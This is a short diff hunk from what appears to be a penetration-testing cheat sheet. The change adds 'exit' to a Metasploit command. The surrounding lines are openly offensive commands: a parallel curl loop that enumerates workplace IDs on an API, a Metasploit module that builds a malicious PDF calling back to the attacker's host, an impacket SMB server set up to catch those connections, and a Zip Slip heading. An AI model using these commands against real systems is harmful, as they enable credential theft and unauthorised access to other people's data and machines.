@@ -467,7 +467,7 @@ cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H 
 
 [*] File Upload
 -->> Bad PDF
-msfconsole -q -x 'use auxiliary/fileformat/badpdf; set LHOST $MYIP; set FILENAME x.pdf; run'; cp $HOME/.msf4/local/x.pdf /Upload/x.pdf
+msfconsole -q -x 'use auxiliary/fileformat/badpdf; set LHOST $MYIP; set FILENAME x.pdf; run; exit'; cp $HOME/.msf4/local/x.pdf /Upload/x.pdf
 impacket-smbserver -smb2support $ /Upload/windows
 
 -->> Zip Slip
